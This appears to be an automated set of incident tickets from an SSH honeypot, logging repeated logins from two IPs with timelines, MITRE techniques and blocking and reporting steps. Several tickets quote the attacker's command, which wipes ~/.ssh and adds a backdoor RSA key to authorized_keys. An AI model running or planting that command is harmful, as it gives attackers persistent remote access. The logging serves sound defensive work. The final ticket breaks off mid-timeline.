### 🔴 HIGH · IR-596759d4c28e

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:26 |
| **Last Seen** | 2026-05-04 16:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:26:57` | `cowrie.session.connect` |
| `2026-05-04 16:26:57` | `cowrie.client.version` |
| `2026-05-04 16:26:58` | `cowrie.client.kex` |
| `2026-05-04 16:26:59` | `cowrie.login.success` |
| `2026-05-04 16:27:00` | `cowrie.session.params` |
| `2026-05-04 16:27:00` | `cowrie.command.input` |
| `2026-05-04 16:27:00` | `cowrie.command.failed` |
| `2026-05-04 16:27:00` | `cowrie.log.closed` |
| `2026-05-04 16:27:01` | `cowrie.session.params` |
| `2026-05-04 16:27:01` | `cowrie.command.input` |
| `2026-05-04 16:27:01` | `cowrie.session.file_download` |
| `2026-05-04 16:27:01` | `cowrie.log.closed` |
| `2026-05-04 16:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b8fec7fbb2a

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:27 |
| **Last Seen** | 2026-05-04 16:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:27:05` | `cowrie.session.connect` |
| `2026-05-04 16:27:05` | `cowrie.client.version` |
| `2026-05-04 16:27:05` | `cowrie.client.kex` |
| `2026-05-04 16:27:06` | `cowrie.login.success` |
| `2026-05-04 16:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e7566a63a6d

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:28 |
| **Last Seen** | 2026-05-04 16:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:28:03` | `cowrie.session.connect` |
| `2026-05-04 16:28:03` | `cowrie.client.version` |
| `2026-05-04 16:28:04` | `cowrie.client.kex` |
| `2026-05-04 16:28:05` | `cowrie.login.success` |
| `2026-05-04 16:28:05` | `cowrie.session.params` |
| `2026-05-04 16:28:05` | `cowrie.command.input` |
| `2026-05-04 16:28:05` | `cowrie.command.failed` |
| `2026-05-04 16:28:06` | `cowrie.log.closed` |
| `2026-05-04 16:28:06` | `cowrie.session.params` |
| `2026-05-04 16:28:06` | `cowrie.command.input` |
| `2026-05-04 16:28:06` | `cowrie.session.file_download` |
| `2026-05-04 16:28:06` | `cowrie.log.closed` |
| `2026-05-04 16:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d54e69e79554

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:28 |
| **Last Seen** | 2026-05-04 16:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:28:10` | `cowrie.session.connect` |
| `2026-05-04 16:28:10` | `cowrie.client.version` |
| `2026-05-04 16:28:10` | `cowrie.client.kex` |
| `2026-05-04 16:28:11` | `cowrie.login.success` |
| `2026-05-04 16:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d79bdc25788

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:28 |
| **Last Seen** | 2026-05-04 16:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:28:33` | `cowrie.session.connect` |
| `2026-05-04 16:28:33` | `cowrie.client.version` |
| `2026-05-04 16:28:34` | `cowrie.client.kex` |
| `2026-05-04 16:28:34` | `cowrie.login.success` |
| `2026-05-04 16:28:34` | `cowrie.session.params` |
| `2026-05-04 16:28:34` | `cowrie.command.input` |
| `2026-05-04 16:28:34` | `cowrie.command.failed` |
| `2026-05-04 16:28:35` | `cowrie.log.closed` |
| `2026-05-04 16:28:35` | `cowrie.session.params` |
| `2026-05-04 16:28:35` | `cowrie.command.input` |
| `2026-05-04 16:28:35` | `cowrie.session.file_download` |
| `2026-05-04 16:28:35` | `cowrie.log.closed` |
| `2026-05-04 16:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b22f37c9315

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:28 |
| **Last Seen** | 2026-05-04 16:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:28:37` | `cowrie.session.connect` |
| `2026-05-04 16:28:37` | `cowrie.client.version` |
| `2026-05-04 16:28:38` | `cowrie.client.kex` |
| `2026-05-04 16:28:38` | `cowrie.login.success` |
| `2026-05-04 16:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0895f0b802ef

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:29 |
| **Last Seen** | 2026-05-04 16:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:29:07` | `cowrie.session.connect` |
| `2026-05-04 16:29:07` | `cowrie.client.version` |
| `2026-05-04 16:29:07` | `cowrie.client.kex` |
| `2026-05-04 16:29:09` | `cowrie.login.success` |
| `2026-05-04 16:29:09` | `cowrie.session.params` |
| `2026-05-04 16:29:09` | `cowrie.command.input` |
| `2026-05-04 16:29:09` | `cowrie.command.failed` |
| `2026-05-04 16:29:10` | `cowrie.log.closed` |
| `2026-05-04 16:29:10` | `cowrie.session.params` |
| `2026-05-04 16:29:10` | `cowrie.command.input` |
| `2026-05-04 16:29:11` | `cowrie.session.file_download` |
| `2026-05-04 16:29:11` | `cowrie.log.closed` |
| `2026-05-04 16:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17ff83244a4c

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:29 |
| **Last Seen** | 2026-05-04 16:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:29:14` | `cowrie.session.connect` |
| `2026-05-04 16:29:14` | `cowrie.client.version` |
| `2026-05-04 16:29:14` | `cowrie.client.kex` |
| `2026-05-04 16:29:16` | `cowrie.login.success` |
| `2026-05-04 16:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aea94f1d7078

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:30 |
| **Last Seen** | 2026-05-04 16:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:30:13` | `cowrie.session.connect` |
| `2026-05-04 16:30:13` | `cowrie.client.version` |
| `2026-05-04 16:30:13` | `cowrie.client.kex` |
| `2026-05-04 16:30:14` | `cowrie.login.success` |
| `2026-05-04 16:30:15` | `cowrie.session.params` |
| `2026-05-04 16:30:15` | `cowrie.command.input` |
| `2026-05-04 16:30:15` | `cowrie.command.failed` |
| `2026-05-04 16:30:15` | `cowrie.log.closed` |
| `2026-05-04 16:30:16` | `cowrie.session.params` |
| `2026-05-04 16:30:16` | `cowrie.command.input` |
| `2026-05-04 16:30:16` | `cowrie.session.file_download` |
| `2026-05-04 16:30:16` | `cowrie.log.closed` |
| `2026-05-04 16:30:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16d146a0997b

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:30 |
| **Last Seen** | 2026-05-04 16:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:30:20` | `cowrie.session.connect` |
| `2026-05-04 16:30:20` | `cowrie.client.version` |
| `2026-05-04 16:30:20` | `cowrie.client.kex` |
| `2026-05-04 16:30:21` | `cowrie.login.success` |
| `2026-05-04 16:30:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-102960cc4547

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:31 |
| **Last Seen** | 2026-05-04 16:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:31:22` | `cowrie.session.connect` |
| `2026-05-04 16:31:22` | `cowrie.client.version` |
| `2026-05-04 16:31:22` | `cowrie.client.kex` |
| `2026-05-04 16:31:23` | `cowrie.login.success` |
| `2026-05-04 16:31:24` | `cowrie.session.params` |
| `2026-05-04 16:31:24` | `cowrie.command.input` |
| `2026-05-04 16:31:24` | `cowrie.command.failed` |
| `2026-05-04 16:31:24` | `cowrie.log.closed` |
| `2026-05-04 16:31:25` | `cowrie.session.params` |
| `2026-05-04 16:31:25` | `cowrie.command.input` |
| `2026-05-04 16:31:25` | `cowrie.session.file_download` |
| `2026-05-04 16:31:25` | `cowrie.log.closed` |
| `2026-05-04 16:31:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-770ccf2e8e19

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:31 |
| **Last Seen** | 2026-05-04 16:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:31:28` | `cowrie.session.connect` |
| `2026-05-04 16:31:28` | `cowrie.client.version` |
| `2026-05-04 16:31:29` | `cowrie.client.kex` |
| `2026-05-04 16:31:30` | `cowrie.login.success` |
| `2026-05-04 16:31:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f172e8350743

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:32 |
| **Last Seen** | 2026-05-04 16:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:32:27` | `cowrie.session.connect` |
| `2026-05-04 16:32:27` | `cowrie.client.version` |
| `2026-05-04 16:32:27` | `cowrie.client.kex` |
| `2026-05-04 16:32:28` | `cowrie.login.success` |
| `2026-05-04 16:32:29` | `cowrie.session.params` |
| `2026-05-04 16:32:29` | `cowrie.command.input` |
| `2026-05-04 16:32:29` | `cowrie.command.failed` |
| `2026-05-04 16:32:29` | `cowrie.log.closed` |
| `2026-05-04 16:32:30` | `cowrie.session.params` |
| `2026-05-04 16:32:30` | `cowrie.command.input` |
| `2026-05-04 16:32:30` | `cowrie.session.file_download` |
| `2026-05-04 16:32:30` | `cowrie.log.closed` |
| `2026-05-04 16:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2d6d461b542

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:32 |
| **Last Seen** | 2026-05-04 16:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:32:34` | `cowrie.session.connect` |
| `2026-05-04 16:32:34` | `cowrie.client.version` |
| `2026-05-04 16:32:34` | `cowrie.client.kex` |
| `2026-05-04 16:32:35` | `cowrie.login.success` |
| `2026-05-04 16:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8240bc080b58

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:33 |
| **Last Seen** | 2026-05-04 16:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:33:16` | `cowrie.session.connect` |
| `2026-05-04 16:33:16` | `cowrie.client.version` |
| `2026-05-04 16:33:16` | `cowrie.client.kex` |
| `2026-05-04 16:33:16` | `cowrie.login.success` |
| `2026-05-04 16:33:16` | `cowrie.session.params` |
| `2026-05-04 16:33:16` | `cowrie.command.input` |
| `2026-05-04 16:33:16` | `cowrie.command.failed` |
| `2026-05-04 16:33:17` | `cowrie.log.closed` |
| `2026-05-04 16:33:17` | `cowrie.session.params` |
| `2026-05-04 16:33:17` | `cowrie.command.input` |
| `2026-05-04 16:33:17` | `cowrie.session.file_download` |
| `2026-05-04 16:33:17` | `cowrie.log.closed` |
| `2026-05-04 16:33:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1c22829a66f

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:33 |
| **Last Seen** | 2026-05-04 16:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:33:19` | `cowrie.session.connect` |
| `2026-05-04 16:33:19` | `cowrie.client.version` |
| `2026-05-04 16:33:19` | `cowrie.client.kex` |
| `2026-05-04 16:33:20` | `cowrie.login.success` |
| `2026-05-04 16:33:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b992f45ca3a

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-05-04 16:34 |
| **Last Seen** | 2026-05-04 16:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:34:34` | `cowrie.session.connect` |
